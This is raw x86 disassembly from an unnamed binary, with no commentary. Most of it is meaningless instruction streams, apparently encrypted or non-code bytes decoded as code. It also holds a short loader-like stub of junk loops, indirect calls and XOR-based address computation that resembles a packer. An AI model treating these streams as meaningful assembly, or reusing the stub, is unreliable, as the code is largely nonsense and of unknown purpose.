  40c597:	mov    ch,0x30
  40c599:	icebp  
  40c59a:	aaa    
  40c59b:	mov    al,ds:0x12671884
  40c5a0:	retf   0x1a7a
  40c5a3:	fst    QWORD PTR [eax-0x10675da]
  40c5a9:	mov    eax,ds:0x8330e078
  40c5ae:	lock test al,0xc0
  40c5b1:	inc    edi
  40c5b2:	ins    BYTE PTR es:[edi],dx
  40c5b3:	sub    DWORD PTR [edx+esi*2-0x6f92f0ef],ecx
  40c5ba:	inc    ebx
  40c5bb:	adc    BYTE PTR [edx+edx*1+0x18393326],al
  40c5c2:	(bad)  
  40c5c3:	and    BYTE PTR [edx-0x2f],ch
  40c5c6:	sbb    eax,DWORD PTR [ebx+0x2a]
  40c5c9:	retf   
  40c5ca:	cmp    cl,BYTE PTR [ecx]
  40c5cc:	ror    DWORD PTR fs:[edi-0x700b0bc2],0x66
  40c5d4:	std    
  40c5d5:	mov    dl,0x2d
  40c5d7:	das    
  40c5d8:	lods   al,BYTE PTR ds:[esi]
  40c5d9:	mov    dh,0x15
  40c5db:	aaa    
  40c5dc:	clc    
  40c5dd:	pop    edx
  40c5de:	std    
  40c5df:	imul   esi,ecx,0x5e
  40c5e2:	leave  
  40c5e3:	test   al,0xaa
  40c5e5:	rcr    DWORD PTR [edi+ecx*2-0x68f70242],0xa7
  40c5ed:	loop   0x40c600
  40c5ef:	jg     0x40c664
  40c5f1:	test   BYTE PTR [ebx],ah
  40c5f3:	aam    0xa8
  40c5f5:	adc    al,0x1c
  40c5f7:	adc    ah,BYTE PTR [edx+ecx*2]
  40c5fa:	inc    eax
  40c5fb:	(bad)  
  40c5fc:	(bad)  
  40c5fd:	(bad)  
  40c5fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ff:	sub    al,0x76
  40c601:	cmp    al,0xd3
  40c603:	fistp  QWORD PTR [ebx-0x80]
  40c606:	les    edx,FWORD PTR [esp+esi*8-0x61]
  40c60a:	cdq    
  40c60b:	out    dx,al
  40c60c:	adc    al,0xda
  40c60e:	ret    
  40c60f:	std    
  40c610:	pop    eax
  40c611:	inc    esi
  40c612:	inc    ecx
  40c613:	fwait
  40c614:	pop    esp
  40c615:	sub    BYTE PTR [ebx-0x2c],ch
  40c618:	ins    BYTE PTR es:[edi],dx
  40c619:	xchg   ecx,eax
  40c61a:	pop    eax
  40c61b:	sub    edx,esi
  40c61d:	retf   0xa652
  40c620:	rol    BYTE PTR [ebx+eax*1],1
  40c623:	push   edi
  40c624:	push   0xfffffff8
  40c626:	mov    al,ds:0xead94318
  40c62b:	pop    eax
  40c62c:	(bad)  
  40c62d:	jmp    0xd05a5428
  40c632:	push   esp
  40c633:	push   es
  40c634:	push   es
  40c635:	test   al,0xfe
  40c637:	mov    al,ds:0xb074e938
  40c63c:	jge    0x40c5be
  40c63e:	ins    BYTE PTR es:[edi],dx
  40c63f:	push   ds
  40c640:	sub    ecx,esp
  40c642:	dec    edx
  40c643:	les    ebp,FWORD PTR [ebx+esi*4+0x403d8ac0]
  40c64a:	push   ebx
  40c64b:	retf   0xca66
  40c64e:	sahf   
  40c64f:	xor    al,0x81
  40c651:	iret   
  40c652:	add    edi,DWORD PTR [ebx+eax*8+0x1e3c9449]
  40c659:	shl    BYTE PTR [ebx+0x6ec7f033],cl
  40c65f:	(bad)  
  40c660:	mov    fs,WORD PTR [ebp+0x7b]
  40c663:	xchg   ecx,eax
  40c664:	lods   eax,DWORD PTR ds:[esi]
  40c665:	and    DWORD PTR [ecx+0x4a],ebp
  40c668:	stos   DWORD PTR es:[edi],eax
  40c669:	pusha  
  40c66a:	add    eax,0x92cb06aa
  40c66f:	push   ebx
  40c670:	inc    ebx
  40c671:	out    0x32,al
  40c673:	test   eax,0xb977cf87
  40c678:	xlat   BYTE PTR ds:[ebx]
  40c679:	out    0x4e,eax
  40c67b:	sub    cl,BYTE PTR [eax+0xdd90218]
  40c681:	mov    DWORD PTR [esi+ecx*8-0x36],ebp
  40c685:	sub    ecx,DWORD PTR [esi]
  40c687:	ds (bad) 
  40c689:	mov    cl,0xe1
  40c68b:	repz push 0x67
  40c68e:	adc    eax,0x82f67eca
  40c693:	add    cl,BYTE PTR [ebx]
  40c695:	das    
  40c696:	sahf   
  40c697:	fwait
  40c698:	xor    bh,bl
  40c69a:	jge    0x40c6b5
  40c69c:	js     0x40c662
  40c69e:	sbb    ecx,DWORD PTR [eax]
  40c6a0:	es cmp al,0x12
  40c6a3:	hlt    
  40c6a4:	sub    edi,DWORD PTR [esi]
  40c6a6:	mov    eax,ds:0x49a284c5
  40c6ab:	test   DWORD PTR [ebx],eax
  40c6ad:	data16 mov ch,0x66
  40c6b0:	push   es
  40c6b1:	mov    BYTE PTR [edi-0x2d45fd2e],dl
  40c6b7:	inc    eax
  40c6b8:	mov    ds:0xf6862aff,eax
  40c6bd:	pop    ebp
  40c6be:	cld    
  40c6bf:	pusha  
  40c6c0:	and    DWORD PTR [edi-0x3920fb],edi
  40c6c6:	ret    
  40c6c7:	mov    ds:0xf7254042,eax
  40c6cc:	in     al,dx
  40c6cd:	fdiv   DWORD PTR [esi]
  40c6cf:	ret    0x4652
  40c6d2:	mov    WORD PTR [eax-0x2a],cs
  40c6d5:	dec    ecx
  40c6d6:	scas   eax,DWORD PTR es:[edi]
  40c6d7:	test   BYTE PTR [edi],0x4c
  40c6da:	push   0x19745158
  40c6df:	(bad)  
  40c6e1:	sub    eax,0x976dfaee
  40c6e6:	push   edx
  40c6e7:	stos   DWORD PTR es:[edi],eax
  40c6e8:	pop    ecx
  40c6e9:	add    BYTE PTR [ebx+0x75bdcf7c],bh
  40c6ef:	stc    
  40c6f0:	pop    ecx
  40c6f1:	gs aas 
  40c6f3:	mov    cx,0xccbb
  40c6f7:	into   
  40c6f8:	mov    DWORD PTR [edi+0x35def2a6],ebp
  40c6fe:	test   DWORD PTR [eax+eax*2+0x29],eax
  40c702:	adc    bl,BYTE PTR [ebx-0x34]
  40c705:	adc    edx,DWORD PTR ds:0xb44db0f4
  40c70b:	int    0xc2
  40c70d:	mov    ?,WORD PTR [edi+0x53b78cfd]
  40c713:	push   edi
  40c714:	xchg   DWORD PTR [esp+ebx*1+0x78967767],ebx
  40c71b:	add    bh,BYTE PTR [esp+esi*8+0x26]
  40c71f:	leave  
  40c720:	out    dx,al
  40c721:	repnz and DWORD PTR [esi+0x849af3f],ebx
  40c728:	xor    DWORD PTR [eax],esp
  40c72a:	les    eax,FWORD PTR [edx]
  40c72c:	loope  0x40c746
  40c72e:	lds    esp,FWORD PTR [eax+ebx*4]
  40c731:	mov    ds,WORD PTR [edx+0xa]
  40c734:	das    
  40c735:	and    edx,edi
  40c737:	int3   
  40c738:	push   ecx
  40c739:	clc    
  40c73a:	(bad)  [ecx+0x4f]
  40c73d:	or     eax,0x7d53f5c9
  40c742:	scas   al,BYTE PTR es:[edi]
  40c743:	sar    ecx,0x88
  40c746:	mov    cl,0xde
  40c748:	xchg   ecx,eax
  40c749:	add    ebp,DWORD PTR [edi-0xd94a768]
  40c74f:	sbb    cl,BYTE PTR ds:0x4f7d816
  40c755:	std    
  40c756:	mov    esi,ss
  40c758:	mov    eax,0x534e5bf0
  40c75d:	cli    
  40c75e:	bound  ecx,QWORD PTR [edi-0x50]
  40c761:	mov    ebx,0x4f6412a6
  40c766:	push   0x43
  40c768:	xor    al,0xbd
  40c76a:	sub    esp,ecx
  40c76c:	js     0x40c72f
  40c76e:	xor    eax,0xb84efc7e
  40c773:	mov    ecx,0x1714438a
  40c778:	cwde   
  40c779:	imul   ecx,DWORD PTR [ecx-0x7bf9fb24],0x5b9cba8
  40c783:	pushf  
  40c784:	jb     0x40c7b8
  40c786:	add    cl,cl
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434272,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432600,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432600
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432600,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432600,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432600,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432cc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432c1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434286,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434286
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434286,ecx
  40c805:	cmp    DWORD PTR ds:0x434286,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434286,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43431d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4328ea
  40c82d:	cmp    DWORD PTR ds:0x434286,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434286
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434286,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4342a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4342a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4342a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432b66
  40c87c:	cmp    DWORD PTR ds:0x4342a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4342a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4342a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4342a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4342a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	shl    DWORD PTR [edx+0x736d488f],0x85
  40c8e0:	jo     0x40c952
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c8b7
  40c8e7:	pusha  
  40c8e8:	test   al,0x63
  40c8ea:	outs   dx,DWORD PTR ds:[esi]
  40c8eb:	pop    eax
  40c8ec:	mov    ds:0x8715de81,eax
  40c8f1:	outs   dx,DWORD PTR ds:[esi]
  40c8f2:	dec    edx
  40c8f3:	jbe    0x40c971
  40c8f5:	mov    BYTE PTR [ebx+0x405130c6],cl
  40c8fb:	adc    al,0x4d
  40c8fd:	in     al,0xa2
  40c8ff:	inc    ebx
  40c900:	mov    edx,0xd367438a
  40c905:	and    al,0x59
  40c907:	ds (bad) 
  40c909:	jb     0x40c8fd
  40c90b:	out    0xd3,eax
  40c90d:	xchg   DWORD PTR [edx+0x1cfe3fec],eax
  40c913:	in     eax,0xb7
  40c915:	mov    ebp,0x7b68b3b9
  40c91a:	or     DWORD PTR [eax+edi*4+0x7554cded],edi
  40c921:	call   0x7c9c5a8e
  40c926:	mov    edx,0x29a1a233
  40c92b:	in     eax,0x82
  40c92d:	mov    esp,0xb810fca4
  40c932:	and    dh,BYTE PTR [edi]
  40c934:	sub    dh,BYTE PTR [edi-0x79]
  40c937:	xlat   BYTE PTR ds:[ebx]
  40c938:	ficomp DWORD PTR [esi-0x33]
  40c93b:	sub    al,0xa8
  40c93d:	pop    es
  40c93e:	scas   al,BYTE PTR es:[edi]
  40c93f:	add    bl,BYTE PTR [esi-0x6b6593cc]
  40c945:	stos   BYTE PTR es:[edi],al
  40c946:	lock out dx,al
  40c948:	jle    0x40c93e
  40c94a:	mov    edx,0x9c88b506
  40c94f:	ficom  WORD PTR [eax+0x38]
  40c952:	inc    eax
  40c953:	push   0x5d
  40c955:	push   eax
  40c956:	inc    ax
  40c958:	and    al,0x55
  40c95a:	pusha  
  40c95b:	in     al,dx
  40c95c:	xchg   BYTE PTR [ebx-0x4a],bh
  40c95f:	pop    esp
  40c960:	int    0x6a
  40c962:	mov    eax,DWORD PTR [ebx+0x14]
  40c965:	sbb    eax,0x9f4b769d
  40c96a:	cmp    eax,0x172d155a
  40c96f:	fldcw  WORD PTR [eax+0xaa65d8a]
  40c975:	push   es
  40c976:	jno    0x40c9ec
  40c978:	pusha  
  40c979:	jo     0x40c9c6
  40c97b:	pop    eax
  40c97c:	into   
  40c97d:	push   edx
  40c97e:	loope  0x40c9a8
  40c980:	fxtract 
  40c982:	jno    0x40c976
  40c984:	jecxz  0x40c9e7
  40c986:	push   edi
  40c987:	cld    
  40c988:	sbb    ebx,esi
  40c98a:	pop    edx
  40c98b:	adc    bl,BYTE PTR [ebx-0x57c92f9c]
  40c991:	stc    
  40c992:	and    al,ah
  40c994:	loopne 0x40c95f
  40c996:	mov    al,0x17
  40c998:	es add dh,0x64
  40c99c:	imul   ebx
  40c99e:	loop   0x40c985
  40c9a0:	mov    dl,0xcd
  40c9a2:	sub    DWORD PTR [eax],edx
  40c9a4:	jbe    0x40c9a2
  40c9a6:	mov    al,0xe8
  40c9a8:	mov    ds:0x9df21bc5,eax
  40c9ad:	sbb    ebx,ebx
  40c9af:	inc    edx
  40c9b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9b1:	sbb    eax,0x42fdccb7
  40c9b6:	xor    DWORD PTR [edi],0x96704da3
  40c9bc:	jl     0x40ca33
  40c9be:	rol    BYTE PTR ds:0x4b2aa85c,1
  40c9c4:	push   esi
  40c9c5:	les    esp,FWORD PTR [eax]
  40c9c7:	sbb    al,0x8d
  40c9c9:	inc    esp
  40c9ca:	mov    eax,0x32d82e63
  40c9cf:	adc    al,0xd1
  40c9d1:	mov    ?,ebx
  40c9d3:	cmc    
  40c9d4:	lods   al,BYTE PTR cs:[esi]
  40c9d6:	mov    eax,ds:0x1afdf633
  40c9db:	add    edx,DWORD PTR [eax+esi*2+0x78b65a69]
  40c9e2:	fbld   TBYTE PTR [edx+edx*4-0x64]
  40c9e6:	test   BYTE PTR [edi-0x2db83e39],ah
  40c9ec:	stc    
  40c9ed:	into   
  40c9ee:	(bad)  
  40c9ef:	scas   eax,DWORD PTR es:[edi]
  40c9f0:	repz in eax,0x1a
  40c9f3:	mov    ecx,0x539e0b9b
  40c9f8:	pop    ebx
  40c9f9:	sbb    al,0x4
  40c9fb:	cmp    cl,BYTE PTR [ecx-0x110d346c]
  40ca01:	lock pop es
  40ca03:	sahf   
  40ca04:	push   ebx
  40ca05:	pop    ecx
  40ca06:	jmp    0x911e4130
  40ca0b:	mov    ebp,0xf20528e4
  40ca10:	adc    edx,esi
  40ca12:	cmp    DWORD PTR [eax+0x2109068e],ebp
  40ca18:	inc    ebx
  40ca19:	test   eax,0x56507718
  40ca1e:	repz xor eax,0xbda9286b
  40ca24:	push   ecx
  40ca25:	pop    esp
  40ca26:	outs   dx,DWORD PTR ds:[esi]
  40ca27:	push   cs
  40ca28:	adc    BYTE PTR [eax],bl
  40ca2a:	jge    0x40c9c1
  40ca2c:	sbb    eax,0xd6295666
  40ca31:	and    ecx,DWORD PTR [ebp+0x45727141]
  40ca37:	xchg   edx,eax
  40ca38:	push   esp
  40ca39:	call   0x6cbb:0xf31a075d
  40ca40:	add    al,0xfa
  40ca42:	(bad)  
  40ca43:	retf   
  40ca44:	loopne 0x40c9e0
  40ca46:	mov    ebx,0xd75260f1
  40ca4b:	outs   dx,DWORD PTR ds:[esi]
  40ca4c:	in     al,0x5d
  40ca4e:	mov    dl,0xc9
  40ca50:	and    BYTE PTR [ebx*8+0x315035bd],cl
  40ca57:	sbb    bl,ch
  40ca59:	push   eax
  40ca5a:	mov    gs,ebx
  40ca5c:	jle    0x40c9e1
  40ca5e:	dec    esi
  40ca5f:	sbb    edi,eax
  40ca61:	out    0x92,eax
  40ca63:	or     DWORD PTR [edx-0x20b34723],ebp
  40ca69:	jp     0x40ca93
  40ca6b:	std    
  40ca6c:	inc    edi
  40ca6d:	call   0x40165bd9
  40ca72:	cmp    BYTE PTR [esi-0x168bd67c],dl
  40ca78:	mov    bl,0x89
  40ca7a:	(bad)  
  40ca7b:	es aam 0xec
  40ca7e:	inc    edi
  40ca7f:	xchg   esi,eax
  40ca80:	jns    0x40caee
  40ca82:	push   esi
  40ca83:	xor    esp,ebp
  40ca85:	sub    BYTE PTR [ecx-0x57d87a68],0xec
  40ca8c:	cmp    al,cl
  40ca8e:	dec    edx
  40ca8f:	int3   
  40ca90:	data16 jp 0x40caa2
  40ca93:	outs   dx,DWORD PTR ds:[esi]
  40ca94:	xchg   BYTE PTR [eax+0x14],ah
  40ca97:	lahf   
  40ca98:	or     dl,cl
  40ca9a:	loop   0x40cac4
  40ca9c:	(bad)  
  40ca9e:	and    ch,BYTE PTR [ebx]
  40caa0:	mov    al,ds:0xaf5cda4f
  40caa5:	sbb    dh,BYTE PTR [ecx-0x3fa011a4]
  40caab:	cli    
  40caac:	mov    cl,ch
  40caae:	imul   edi,ebp,0xffffff8f
  40cab1:	dec    ebp
  40cab2:	icebp  
  40cab3:	cmp    esi,eax
  40cab5:	shr    DWORD PTR [edi-0x7f4bccf9],cl
  40cabb:	and    edi,ebp
  40cabd:	out    0x25,al
  40cabf:	push   esi
  40cac0:	mov    fs,esi
  40cac2:	test   al,0xac
  40cac4:	ret    0xb826
  40cac7:	imul   dl
  40cac9:	leave  
  40caca:	pop    es
  40cacb:	sbb    bh,cl
  40cacd:	popa   
  40cace:	sti    
  40cacf:	pop    ecx
  40cad0:	add    ecx,DWORD PTR [esi-0x4d1a585d]
  40cad6:	jmp    0x2d1f:0xb2b6abc
  40cadd:	xor    al,0xf1
  40cadf:	jmp    0xed9f:0x5684dd96
  40cae6:	push   eax
  40cae7:	pop    ebx
  40cae8:	fadd   st(4),st
  40caea:	out    dx,eax
  40caeb:	lea    esi,[ebx-0x14476b0b]
  40caf1:	cmp    ebp,DWORD PTR [ebx+0x43519fc0]
  40caf7:	and    eax,0x72b209f6
  40cafc:	mov    ds:0xca8d720f,eax
  40cb01:	shl    BYTE PTR [ecx+0x4e27ab72],0xc4
  40cb08:	or     esp,DWORD PTR [eax]
  40cb0a:	mov    ds:0x388f29cb,al
  40cb0f:	les    edx,FWORD PTR [esi]
  40cb11:	xchg   edx,eax
  40cb12:	jecxz  0x40cac5
  40cb14:	jmp    0x40cb29
  40cb16:	mul    DWORD PTR [ebp-0x6acf05d0]
  40cb1c:	add    eax,0x62239bbc
  40cb21:	fwait
  40cb22:	jge    0x40cad6
  40cb24:	data16 xlat BYTE PTR ds:[ebx]
  40cb26:	adc    dh,dl
  40cb28:	mov    ds,WORD PTR [ebp+0x5ab256d2]
  40cb2e:	push   es
  40cb2f:	js     0x40cab3
  40cb31:	js     0x40cac7
  40cb33:	outs   dx,BYTE PTR ds:[esi]
  40cb34:	jmp    0x30f0daf0
  40cb39:	sub    BYTE PTR [edi+eax*1+0xfc63b81],bh
  40cb40:	test   DWORD PTR [eax],edx
  40cb42:	add    BYTE PTR [eax],al
  40cb44:	add    BYTE PTR [ecx+0x416224],ah
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	ins    BYTE PTR es:[edi],dx
  40cb6c:	ins    DWORD PTR es:[edi],dx
  40cb6d:	mov    edx,0x7082cc2f
  40cb72:	jo     0x40cb3d
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb36
  40cb78:	rcr    DWORD PTR [edi-0x5921a0a3],1
  40cb7e:	cmp    eax,0x6fef6a18
  40cb83:	xor    al,0xdb
  40cb85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb86:	sbb    eax,0xac7e154a
  40cb8b:	imul   esi,DWORD PTR [edi+0x59b99076],0x46c32489
  40cb95:	and    edx,DWORD PTR [eax+0xb]
  40cb98:	aad    0x4f
  40cb9a:	mov    dh,0x44
  40cb9c:	sub    dh,BYTE PTR [edi+esi*8+0xc]
  40cba0:	inc    esi
  40cba1:	int3   
  40cba2:	loope  0x40cb80
  40cba4:	in     eax,0xa0
  40cba6:	adc    eax,0xd9116722
  40cbab:	adc    esi,DWORD PTR [ebp-0x5962395]
  40cbb1:	inc    ebp
  40cbb2:	ins    BYTE PTR es:[edi],dx
  40cbb3:	pop    ss
  40cbb4:	out    dx,eax
  40cbb5:	xor    bl,BYTE PTR [ecx]
  40cbb7:	ucomiss xmm7,DWORD PTR [ecx-0x5f3afbb3]
  40cbbe:	icebp  
  40cbbf:	in     eax,0x10
  40cbc1:	inc    edx
  40cbc2:	hlt    
  40cbc3:	adc    cl,BYTE PTR [ebx]
  40cbc5:	ds jmp 0x40cbfd
  40cbc8:	imul   BYTE PTR ds:[edi-0x55]
  40cbcc:	sub    DWORD PTR [ecx+0x2e7e12e5],esp
  40cbd2:	dec    eax
  40cbd3:	jl     0x40cb87
  40cbd5:	addr16 ss cld 
  40cbd8:	dec    eax
  40cbd9:	dec    esi
  40cbda:	movq   mm0,mm6
  40cbdd:	stos   BYTE PTR es:[edi],al
  40cbde:	fistp  DWORD PTR [ebp-0x7f]
  40cbe1:	inc    ecx
  40cbe2:	out    0x89,al
  40cbe4:	aaa    
  40cbe5:	pop    eax
  40cbe6:	inc    esp
  40cbe7:	retf   
  40cbe8:	addr16 xor al,0xd9
  40cbeb:	pop    edx
  40cbec:	mov    DWORD PTR [ebp-0x11],esp
  40cbef:	dec    ebp
  40cbf0:	inc    ebp
  40cbf1:	mov    ch,0x30
  40cbf3:	pop    ss
  40cbf4:	punpcklbw mm3,DWORD PTR [ecx]
  40cbf7:	sti    
  40cbf8:	shl    edi,1
  40cbfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbfb:	xor    BYTE PTR [edx],dl
  40cbfd:	mov    ebp,0xb44ade2f
  40cc02:	fidivr DWORD PTR [edx+0x61490f08]
  40cc08:	xor    dh,cl
  40cc0a:	sti    
  40cc0b:	jecxz  0x40cc81
  40cc0d:	pushf  
  40cc0e:	test   DWORD PTR [eax+0x6c],esp
  40cc11:	xchg   edx,eax
  40cc12:	push   ss
  40cc13:	fidivr WORD PTR [eax-0x5a1f3552]
  40cc19:	imul   edx,DWORD PTR [edi],0xffffff9e
  40cc1c:	int3   
  40cc1d:	sub    eax,0x2913df7b
  40cc22:	arpl   WORD PTR [ebx-0x2c],sp
  40cc25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc26:	mov    bl,0xc5
  40cc28:	jnp    0x40cc20
  40cc2a:	jb     0x40cc95
  40cc2c:	jge    0x40cc94
  40cc2e:	cmp    eax,0xe300c3e2
  40cc33:	sbb    WORD PTR [edi-0x38c73275],bx
  40cc3a:	imul   esi,esi,0x6a
  40cc3d:	mov    eax,0x5114a721
  40cc42:	aas    
  40cc43:	loop   0x40cc05
  40cc45:	cld    
  40cc46:	call   0x8ea0:0xd13dc6e5
  40cc4d:	stos   BYTE PTR es:[edi],al
  40cc4e:	dec    esi
  40cc4f:	mov    cs,esp
  40cc51:	pop    eax
  40cc52:	dec    edi
  40cc53:	shl    DWORD PTR [edx],0x72
  40cc56:	retf   
  40cc57:	in     al,dx
  40cc58:	pop    ecx
  40cc59:	sub    cl,BYTE PTR [eax+0x5c0b57d6]
  40cc5f:	jmp    0x40ccbf
  40cc61:	je     0x40cc8a
  40cc63:	imul   esi,DWORD PTR [eax-0x7a],0xffffff97
  40cc67:	mov    esi,0x1b67bec9
  40cc6c:	fcom   DWORD PTR [ebx+edi*4-0x5b]
  40cc70:	sub    ecx,DWORD PTR [esi-0x65]
  40cc73:	inc    esi
  40cc74:	cdq    
  40cc75:	call   0x98ff501
  40cc7a:	gs cs push ds
  40cc7d:	(bad)  
  40cc7f:	mov    bh,0xa4
  40cc81:	xchg   BYTE PTR [ebp+0x28],ch
  40cc84:	adc    al,0x83
  40cc86:	int3   
  40cc87:	push   ebx
  40cc88:	dec    esp
  40cc89:	mov    edx,0xd135fcd9
  40cc8e:	ins    BYTE PTR es:[edi],dx
  40cc8f:	fidiv  WORD PTR [ecx]
  40cc91:	inc    esp
  40cc92:	jno    0x40cc7d
  40cc94:	sub    esi,DWORD PTR [edi+0x50]
  40cc97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc99:	int    0x81
  40cc9b:	push   0x26
  40cc9d:	lahf   
  40cc9e:	jge    0x40ccbf
  40cca0:	scas   eax,DWORD PTR es:[edi]
  40cca1:	popf   
  40cca2:	ja     0x40ccc3
  40cca4:	aad    0xa5
  40cca6:	cwde   
  40cca7:	fcom   QWORD PTR [eax+0x1bbacfc6]
  40ccad:	neg    bh
  40ccaf:	loop   0x40cc6a
  40ccb1:	inc    DWORD PTR [edx-0x23cf0be0]
  40ccb7:	xchg   DWORD PTR [esi+0x628923a0],esi
  40ccbd:	and    DWORD PTR [ebp+0x353bb9aa],esp
  40ccc3:	nop
  40ccc4:	adc    esi,DWORD PTR [eax]
  40ccc6:	mov    ebx,0x6ebcf64e
  40cccb:	push   0xffffffde
  40cccd:	jg     0x40cd4d
  40cccf:	push   0xffffffb4
  40ccd1:	add    eax,ebx
  40ccd3:	add    al,0x4a
  40ccd5:	add    BYTE PTR [ebx],0x83
  40ccd8:	inc    ecx
  40ccd9:	imul   ebp,DWORD PTR ss:[eax+ebx*8],0x2b9e14dd
  40cce1:	dec    esi
  40cce2:	(bad)  
  40cce3:	jl     0x40cd17
  40cce5:	fldcw  WORD PTR [eax-0x4fd7716a]
  40cceb:	rcl    DWORD PTR [esi+0x26],1
  40ccee:	adc    BYTE PTR [esi],0xaf
  40ccf1:	xchg   BYTE PTR [eax],al
  40ccf3:	iret   
  40ccf4:	cmp    al,0xf5
  40ccf6:	jl     0x40cd63
  40ccf8:	adc    dh,BYTE PTR [eax-0x61b323a]
  40ccfe:	add    BYTE PTR [edx+0x2],dl
  40cd01:	outs   dx,BYTE PTR ds:[esi]
  40cd02:	mov    ecx,0x3dfc6c9f
  40cd07:	icebp  
  40cd08:	cld    
  40cd09:	xor    eax,0x3bfa7d52
  40cd0e:	mov    al,0x2e
  40cd10:	dec    esi
  40cd11:	or     BYTE PTR [eax+0x610e7c36],ah
  40cd17:	(bad)  
  40cd18:	pop    edx
  40cd19:	retf   0x33df
  40cd1c:	cmp    edx,DWORD PTR [ecx]
  40cd1e:	fwait
  40cd1f:	(bad)  
  40cd20:	shr    BYTE PTR [ebx],cl
  40cd22:	lea    ebp,[eax]
  40cd24:	aam    0x1a
  40cd26:	cs in  eax,0xdf
  40cd29:	jb     0x40ccf3
  40cd2b:	dec    ebp
  40cd2c:	mov    ah,0x7c
  40cd2e:	cwde   
  40cd2f:	push   edx
  40cd30:	dec    edi
  40cd31:	leave  
  40cd32:	ret    
  40cd33:	stos   DWORD PTR es:[edi],eax
  40cd34:	sub    DWORD PTR [esi+0x0],edx
  40cd37:	add    DWORD PTR [eax+0x30],edi
  40cd3a:	fwait
  40cd3b:	call   0x87e5:0xb55829
  40cd42:	push   edi
  40cd43:	push   edx
  40cd44:	pop    DWORD PTR [ecx+edx*8]
  40cd47:	push   0x18
  40cd49:	(bad)  
  40cd4a:	mov    edi,0x45a19afe
  40cd4f:	call   0xc6a8a7ce
  40cd54:	fwait
  40cd55:	mov    bh,BYTE PTR [edi+ebx*2-0x7748e5d7]
  40cd5c:	addr16 lahf 
  40cd5e:	push   esi
  40cd5f:	jge    0x40cd12
  40cd61:	xor    eax,0x6701e4cf
  40cd66:	repnz inc eax
  40cd68:	ficom  DWORD PTR [ebx-0x70e98ec0]
  40cd6e:	test   DWORD PTR [esi],edi
  40cd70:	xchg   edx,eax
  40cd71:	lds    esi,FWORD PTR [eiz*8+0x2e0aa44f]
  40cd78:	inc    eax
  40cd79:	or     dh,BYTE PTR [edx]
  40cd7b:	cmp    al,bl
  40cd7d:	and    esi,esp
  40cd7f:	jnp    0x40cd7b
  40cd81:	retf   0x939b
  40cd84:	ds xchg esp,eax
  40cd86:	jg     0x40cd52
  40cd88:	imul   eax,ebx,0xffffffcb
  40cd8b:	push   0x6f6496d3
  40cd90:	sbb    edx,eax
  40cd92:	mov    edi,0x3059b8fb
  40cd97:	mov    gs,ebx
  40cd99:	out    dx,eax
  40cd9a:	ins    DWORD PTR es:[edi],dx
  40cd9b:	gs std 
  40cd9d:	test   eax,0x2a3b73a8
